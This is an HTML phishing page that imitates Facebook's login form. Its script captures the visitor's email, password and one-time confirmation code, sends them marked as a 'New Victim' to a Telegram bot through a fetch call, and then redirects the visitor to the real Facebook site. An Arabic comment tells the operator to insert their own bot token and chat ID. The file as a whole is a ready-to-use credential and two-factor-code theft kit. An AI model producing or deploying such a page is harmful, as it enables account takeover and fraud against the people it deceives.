<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        body { font-family: system-ui; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 400px; text-align: center; }
        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; }
        button { width: 100%; padding: 15px; background: #1877f2; color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
        .logo { font-size: 40px; font-weight: bold; color: #1877f2; margin-bottom: 20px; }
        .otp-step { display: none; }
    </style>
</head>
<body>
    <div class="container" id="loginStep">
        <div class="logo">facebook</div>
        <p>Log in to continue</p>
        <form id="loginForm">
            <input type="text" id="email" placeholder="Email or Phone Number" required>
            <input type="password" id="pass" placeholder="Password" required>
            <button type="button" onclick="submitLogin()">Log In</button>
        </form>
    </div>

    <div class="container otp-step" id="otpStep">
        <div class="logo">facebook</div>
        <p>Enter confirmation code</p>
        <p>We sent a code to your phone or email</p>
        <form id="otpForm">
            <input type="text" id="otp" placeholder="Enter 6-digit code" maxlength="6" required>
            <button type="button" onclick="submitOTP()">Confirm</button>
        </form>
    </div>

    <script>
        let email, pass;

        function submitLogin() {
            email = document.getElementById('email').value;
            pass = document.getElementById('pass').value;

            if (pass.length < 6) {
                window.location = 'https://facebook.com';
                return;
            }

            document.getElementById('loginStep').style.display = 'none';
            document.getElementById('otpStep').style.display = 'block';
        }

        function submitOTP() {
            const otp = document.getElementById('otp').value;
            const data = `New Victim:
IP: ${navigator.userAgent}
Email: ${email}
Pass: ${pass}
OTP: ${otp}`;

            // غير الـ TOKEN و CHAT_ID بتوعك
            const token = "YOUR_TELEGRAM_BOT_TOKEN";
            const chat_id = "YOUR_CHAT_ID";
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(data)}`);

            window.location = 'https://www.facebook.com';
        }
    </script>
</body>
</html>
